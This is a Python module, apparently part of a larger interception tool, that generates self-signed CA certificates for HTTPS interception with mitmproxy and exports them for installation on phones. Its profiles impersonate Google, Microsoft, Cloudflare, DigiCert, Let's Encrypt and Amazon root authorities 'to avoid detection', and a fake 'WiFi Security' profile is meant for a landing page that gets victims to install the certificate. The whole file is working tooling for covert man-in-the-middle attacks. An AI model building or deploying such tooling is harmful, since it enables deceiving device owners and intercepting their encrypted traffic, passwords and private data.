"""
Certificate Generator for HTTPS Interception.

Generates disguised CA certificates that appear legitimate to avoid detection.
Supports multiple disguise profiles (Google, Microsoft, Cloudflare, etc.).
"""

import json
import os
import subprocess
import sys
from dataclasses import dataclass
from datetime import datetime, timedelta
from pathlib import Path
from typing import Optional

# Certificate disguise profiles - appear as legitimate services
CERT_PROFILES = {
    "google_trust": {
        "common_name": "Google Trust Services LLC",
        "organization": "Google Trust Services LLC",
        "organizational_unit": "Security Services",
        "country": "US",
        "state": "California",
        "locality": "Mountain View",
        "description": "Appears as Google's certificate authority"
    },
    "microsoft_root": {
        "common_name": "Microsoft Root Certificate Authority 2023",
        "organization": "Microsoft Corporation",
        "organizational_unit": "Microsoft IT",
        "country": "US",
        "state": "Washington",
        "locality": "Redmond",
        "description": "Appears as Microsoft's root CA"
    },
    "cloudflare_inc": {
        "common_name": "Cloudflare Inc ECC CA-3",
        "organization": "Cloudflare, Inc.",
        "organizational_unit": "Cloudflare Security",
        "country": "US",
        "state": "California",
        "locality": "San Francisco",
        "description": "Appears as Cloudflare's CA"
    },
    "digicert_global": {
        "common_name": "DigiCert Global Root G2",
        "organization": "DigiCert Inc",
        "organizational_unit": "www.digicert.com",
        "country": "US",
        "state": "Utah",
        "locality": "Lehi",
        "description": "Appears as DigiCert root CA"
    },
    "lets_encrypt": {
        "common_name": "ISRG Root X1",
        "organization": "Internet Security Research Group",
        "organizational_unit": "ISRG",
        "country": "US",
        "state": "California",
        "locality": "Los Angeles",
        "description": "Appears as Let's Encrypt root CA"
    },
    "amazon_trust": {
        "common_name": "Amazon Root CA 1",
        "organization": "Amazon",
        "organizational_unit": "Server CA 1B",
        "country": "US",
        "state": "Washington",
        "locality": "Seattle",
        "description": "Appears as Amazon's root CA"
    },
    "wifi_security": {
        "common_name": "WiFi Security Certificate",
        "organization": "Network Security Services",
        "organizational_unit": "WiFi Protection",
        "country": "US",
        "state": "California",
        "locality": "San Jose",
        "description": "Generic WiFi security cert (for installer landing page)"
    },
    "network_optimizer": {
        "common_name": "Network Optimization Services",
        "organization": "ISP Network Services",
        "organizational_unit": "Performance Optimization",
        "country": "US",
        "state": "New York",
        "locality": "New York",
        "description": "Appears as ISP optimization service"
    }
}


@dataclass
class CertificateInfo:
    """Information about a generated certificate."""
    ca_cert_path: str
    ca_key_path: str
    profile_name: str
    common_name: str
    organization: str
    created_at: str
    expires_at: str
    fingerprint: str


class CertificateGenerator:
    """
    Generates CA certificates for HTTPS interception.
    
    Uses OpenSSL or cryptography library to create certificates
    that can be installed on target devices.
    """
    
    def __init__(self, cert_dir: Optional[str] = None):
        """
        Initialize the certificate generator.
        
        Args:
            cert_dir: Directory to store certificates. Defaults to config/certs/
        """
        if cert_dir is None:
            # Default to project config/certs directory
            project_root = Path(__file__).parent.parent.parent
            cert_dir = project_root / "config" / "certs"
        
        self.cert_dir = Path(cert_dir)
        self.cert_dir.mkdir(parents=True, exist_ok=True)
        
        # Metadata file to track generated certs
        self.metadata_file = self.cert_dir / "cert_metadata.json"
    
    def list_profiles(self) -> dict:
        """
        List all available certificate profiles.
        
        Returns:
            Dictionary of profile names and their descriptions
        """
        return {
            name: {
                "common_name": profile["common_name"],
                "organization": profile["organization"],
                "description": profile["description"]
            }
            for name, profile in CERT_PROFILES.items()
        }
    
    def generate_ca_certificate(
        self,
        profile_name: str = "wifi_security",
        validity_days: int = 3650,
        key_size: int = 2048,
        custom_cn: Optional[str] = None,
        custom_org: Optional[str] = None
    ) -> CertificateInfo:
        """
        Generate a CA certificate using the specified profile.
        
        Args:
            profile_name: Name of the profile to use from CERT_PROFILES
            validity_days: How many days the certificate is valid (default 10 years)
            key_size: RSA key size (2048 or 4096)
            custom_cn: Override the Common Name
            custom_org: Override the Organization
            
        Returns:
            CertificateInfo with paths and metadata
            
        Raises:
            ValueError: If profile doesn't exist
            RuntimeError: If certificate generation fails
        """
        if profile_name not in CERT_PROFILES:
            raise ValueError(f"Unknown profile: {profile_name}. Available: {list(CERT_PROFILES.keys())}")
        
        profile = CERT_PROFILES[profile_name]
        
        # Allow custom overrides
        common_name = custom_cn or profile["common_name"]
        organization = custom_org or profile["organization"]
        
        # Generate unique filename based on profile and timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        base_name = f"{profile_name}_{timestamp}"
        
        key_path = self.cert_dir / f"{base_name}.key"
        cert_path = self.cert_dir / f"{base_name}.crt"
        pem_path = self.cert_dir / f"{base_name}.pem"  # Combined for mitmproxy
        
        # Build subject string
        subject = self._build_subject(
            cn=common_name,
            o=organization,
            ou=profile["organizational_unit"],
            c=profile["country"],
            st=profile["state"],
            l=profile["locality"]
        )
        
        try:
            # Try using cryptography library first (more reliable)
            cert_info = self._generate_with_cryptography(
                key_path=key_path,
                cert_path=cert_path,
                pem_path=pem_path,
                common_name=common_name,
                organization=organization,
                profile=profile,
                validity_days=validity_days,
                key_size=key_size,
                profile_name=profile_name
            )
        except ImportError:
            # Fall back to OpenSSL command line
            cert_info = self._generate_with_openssl(
                key_path=key_path,
                cert_path=cert_path,
                pem_path=pem_path,
                subject=subject,
                validity_days=validity_days,
                key_size=key_size,
                profile_name=profile_name,
                common_name=common_name,
                organization=organization
            )
        
        # Save metadata
        self._save_metadata(cert_info)
        
        return cert_info
    
    def _build_subject(self, cn: str, o: str, ou: str, c: str, st: str, l: str) -> str:
        """Build OpenSSL subject string."""
        return f"/C={c}/ST={st}/L={l}/O={o}/OU={ou}/CN={cn}"
    
    def _generate_with_cryptography(
        self,
        key_path: Path,
        cert_path: Path,
        pem_path: Path,
        common_name: str,
        organization: str,
        profile: dict,
        validity_days: int,
        key_size: int,
        profile_name: str
    ) -> CertificateInfo:
        """Generate certificate using cryptography library."""
        from cryptography import x509
        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.x509.oid import NameOID
        
        # Generate private key
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=key_size,
            backend=default_backend()
        )
        
        # Build certificate subject/issuer
        name = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, profile["country"]),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, profile["state"]),
            x509.NameAttribute(NameOID.LOCALITY_NAME, profile["locality"]),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, organization),
            x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, profile["organizational_unit"]),
            x509.NameAttribute(NameOID.COMMON_NAME, common_name),
        ])
        
        # Certificate validity
        now = datetime.utcnow()
        expires = now + timedelta(days=validity_days)
        
        # Build certificate
        cert_builder = x509.CertificateBuilder()
        cert_builder = cert_builder.subject_name(name)
        cert_builder = cert_builder.issuer_name(name)  # Self-signed
        cert_builder = cert_builder.public_key(private_key.public_key())
        cert_builder = cert_builder.serial_number(x509.random_serial_number())
        cert_builder = cert_builder.not_valid_before(now)
        cert_builder = cert_builder.not_valid_after(expires)
        
        # Add CA extensions
        cert_builder = cert_builder.add_extension(
            x509.BasicConstraints(ca=True, path_length=None),
            critical=True
        )
        cert_builder = cert_builder.add_extension(
            x509.KeyUsage(
                key_cert_sign=True,
                crl_sign=True,
                digital_signature=True,
                key_encipherment=False,
                content_commitment=False,
                data_encipherment=False,
                key_agreement=False,
                encipher_only=False,
                decipher_only=False
            ),
            critical=True
        )
        cert_builder = cert_builder.add_extension(
            x509.SubjectKeyIdentifier.from_public_key(private_key.public_key()),
            critical=False
        )
        
        # Sign the certificate
        certificate = cert_builder.sign(private_key, hashes.SHA256(), default_backend())
        
        # Write private key
        key_bytes = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        )
        key_path.write_bytes(key_bytes)
        
        # Write certificate
        cert_bytes = certificate.public_bytes(serialization.Encoding.PEM)
        cert_path.write_bytes(cert_bytes)
        
        # Write combined PEM (for mitmproxy)
        pem_path.write_bytes(key_bytes + cert_bytes)
        
        # Get fingerprint
        fingerprint = certificate.fingerprint(hashes.SHA256()).hex()
        
        return CertificateInfo(
            ca_cert_path=str(cert_path),
            ca_key_path=str(key_path),
            profile_name=profile_name,
            common_name=common_name,
            organization=organization,
            created_at=now.isoformat(),
            expires_at=expires.isoformat(),
            fingerprint=fingerprint
        )
    
    def _generate_with_openssl(
        self,
        key_path: Path,
        cert_path: Path,
        pem_path: Path,
        subject: str,
        validity_days: int,
        key_size: int,
        profile_name: str,
        common_name: str,
        organization: str
    ) -> CertificateInfo:
        """Generate certificate using OpenSSL command line."""
        # Generate private key
        key_cmd = [
            "openssl", "genrsa",
            "-out", str(key_path),
            str(key_size)
        ]
        
        result = subprocess.run(key_cmd, capture_output=True, text=True)
        if result.returncode != 0:
            raise RuntimeError(f"Failed to generate key: {result.stderr}")
        
        # Generate self-signed certificate
        cert_cmd = [
            "openssl", "req",
            "-new", "-x509",
            "-key", str(key_path),
            "-out", str(cert_path),
            "-days", str(validity_days),
            "-subj", subject,
            "-addext", "basicConstraints=critical,CA:TRUE",
            "-addext", "keyUsage=critical,keyCertSign,cRLSign,digitalSignature"
        ]
        
        result = subprocess.run(cert_cmd, capture_output=True, text=True)
        if result.returncode != 0:
            raise RuntimeError(f"Failed to generate certificate: {result.stderr}")
        
        # Combine into PEM
        with open(pem_path, 'w') as pem_file:
            pem_file.write(key_path.read_text())
            pem_file.write(cert_path.read_text())
        
        # Get fingerprint
        fp_cmd = [
            "openssl", "x509",
            "-in", str(cert_path),
            "-fingerprint", "-sha256",
            "-noout"
        ]
        result = subprocess.run(fp_cmd, capture_output=True, text=True)
        fingerprint = result.stdout.strip().split("=")[-1].replace(":", "").lower()
        
        now = datetime.utcnow()
        expires = now + timedelta(days=validity_days)
        
        return CertificateInfo(
            ca_cert_path=str(cert_path),
            ca_key_path=str(key_path),
            profile_name=profile_name,
            common_name=common_name,
            organization=organization,
            created_at=now.isoformat(),
            expires_at=expires.isoformat(),
            fingerprint=fingerprint
        )
    
    def _save_metadata(self, cert_info: CertificateInfo) -> None:
        """Save certificate metadata to JSON file."""
        metadata = []
        if self.metadata_file.exists():
            metadata = json.loads(self.metadata_file.read_text())
        
        metadata.append({
            "ca_cert_path": cert_info.ca_cert_path,
            "ca_key_path": cert_info.ca_key_path,
            "profile_name": cert_info.profile_name,
            "common_name": cert_info.common_name,
            "organization": cert_info.organization,
            "created_at": cert_info.created_at,
            "expires_at": cert_info.expires_at,
            "fingerprint": cert_info.fingerprint
        })
        
        self.metadata_file.write_text(json.dumps(metadata, indent=2))
    
    def get_active_certificate(self) -> Optional[CertificateInfo]:
        """
        Get the most recently generated certificate.
        
        Returns:
            CertificateInfo or None if no certificates exist
        """
        if not self.metadata_file.exists():
            return None
        
        metadata = json.loads(self.metadata_file.read_text())
        if not metadata:
            return None
        
        latest = metadata[-1]
        return CertificateInfo(**latest)
    
    def export_for_device(
        self,
        cert_path: str,
        output_format: str = "der",
        output_path: Optional[str] = None
    ) -> str:
        """
        Export certificate in format suitable for device installation.
        
        Args:
            cert_path: Path to the .crt file
            output_format: 'der' for Android/iOS, 'pem' for others
            output_path: Custom output path, or auto-generate
            
        Returns:
            Path to exported certificate
        """
        cert_path = Path(cert_path)
        
        if output_path is None:
            suffix = ".cer" if output_format == "der" else ".pem"
            output_path = cert_path.with_suffix(suffix)
        
        output_path = Path(output_path)
        
        if output_format == "der":
            # Convert PEM to DER format (required by Android/iOS)
            cmd = [
                "openssl", "x509",
                "-in", str(cert_path),
                "-outform", "DER",
                "-out", str(output_path)
            ]
        else:
            # Keep as PEM
            cmd = ["cp", str(cert_path), str(output_path)]
        
        result = subprocess.run(cmd, capture_output=True, text=True, shell=(os.name == 'nt'))
        if result.returncode != 0:
            # Try Python copy for Windows
            import shutil
            if output_format == "pem":
                shutil.copy(cert_path, output_path)
            else:
                # Use cryptography for DER conversion
                try:
                    from cryptography import x509
                    from cryptography.hazmat.primitives import serialization
                    
                    cert_data = cert_path.read_bytes()
                    cert = x509.load_pem_x509_certificate(cert_data)
                    der_data = cert.public_bytes(serialization.Encoding.DER)
                    output_path.write_bytes(der_data)
                except ImportError:
                    raise RuntimeError("Cannot convert to DER: cryptography library not installed")
        
        return str(output_path)
    
    def get_mitmproxy_cert_path(self) -> Optional[str]:
        """
        Get path to PEM file suitable for mitmproxy.
        
        Returns:
            Path to combined key+cert PEM file, or None
        """
        cert_info = self.get_active_certificate()
        if cert_info is None:
            return None
        
        # Look for .pem file
        pem_path = Path(cert_info.ca_cert_path).with_suffix(".pem")
        if pem_path.exists():
            return str(pem_path)
        
        return None


def output_json(data: dict) -> None:
    """Output data as JSON to stdout for Tauri IPC."""
    print(json.dumps(data), flush=True)


def main():
    """CLI entry point for certificate generation."""
    import argparse
    
    parser = argparse.ArgumentParser(description="Generate CA certificates for HTTPS interception")
    parser.add_argument("--action", choices=["generate", "list", "export", "active"],
                       default="list", help="Action to perform")
    parser.add_argument("--profile", default="wifi_security",
                       help="Certificate profile to use")
    parser.add_argument("--validity", type=int, default=3650,
                       help="Validity period in days")
    parser.add_argument("--export-format", choices=["der", "pem"], default="der",
                       help="Export format for device installation")
    parser.add_argument("--cert-path", help="Certificate path for export action")
    
    args = parser.parse_args()
    
    generator = CertificateGenerator()
    
    try:
        if args.action == "list":
            profiles = generator.list_profiles()
            output_json({
                "success": True,
                "profiles": profiles
            })
        
        elif args.action == "generate":
            cert_info = generator.generate_ca_certificate(
                profile_name=args.profile,
                validity_days=args.validity
            )
            output_json({
                "success": True,
                "certificate": {
                    "cert_path": cert_info.ca_cert_path,
                    "key_path": cert_info.ca_key_path,
                    "profile": cert_info.profile_name,
                    "common_name": cert_info.common_name,
                    "organization": cert_info.organization,
                    "fingerprint": cert_info.fingerprint,
                    "expires": cert_info.expires_at
                }
            })
        
        elif args.action == "active":
            cert_info = generator.get_active_certificate()
            if cert_info:
                output_json({
                    "success": True,
                    "certificate": {
                        "cert_path": cert_info.ca_cert_path,
                        "key_path": cert_info.ca_key_path,
                        "profile": cert_info.profile_name,
                        "common_name": cert_info.common_name,
                        "fingerprint": cert_info.fingerprint
                    }
                })
            else:
                output_json({
                    "success": False,
                    "error": "No certificates generated yet"
                })
        
        elif args.action == "export":
            if not args.cert_path:
                # Use active certificate
                cert_info = generator.get_active_certificate()
                if not cert_info:
                    output_json({
                        "success": False,
                        "error": "No certificate to export. Generate one first."
                    })
                    return
                cert_path = cert_info.ca_cert_path
            else:
                cert_path = args.cert_path
            
            exported = generator.export_for_device(cert_path, args.export_format)
            output_json({
                "success": True,
                "exported_path": exported,
                "format": args.export_format
            })
    
    except Exception as e:
        output_json({
            "success": False,
            "error": str(e),
            "type": type(e).__name__
        })
        sys.exit(1)


if __name__ == "__main__":
    main()
